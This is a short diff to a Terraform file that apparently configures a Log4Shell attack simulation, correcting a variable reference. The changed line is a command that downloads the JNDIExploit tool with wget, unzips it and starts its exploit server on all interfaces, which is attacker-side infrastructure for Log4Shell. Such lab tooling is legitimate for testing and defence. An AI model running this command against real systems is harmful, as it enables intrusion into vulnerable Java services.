@@ -12,7 +12,7 @@ locals {
     EOT
     )
     command_payload=<<-EOT
-    bash -c "wget ${local.jdniexploit_url} && unzip JNDIExploit.*.zip && rm *.zip && java -jar /app/JNDIExploit-*.jar -i 0.0.0.0 -p ${attacker_http_port}"
+    bash -c "wget ${local.jdniexploit_url} && unzip JNDIExploit.*.zip && rm *.zip && java -jar /app/JNDIExploit-*.jar -i 0.0.0.0 -p ${local.attacker_http_port}"
     EOT
     payload = <<-EOT
     LOGFILE=/tmp/attacker_exec_docker_log4shell_attacker.log
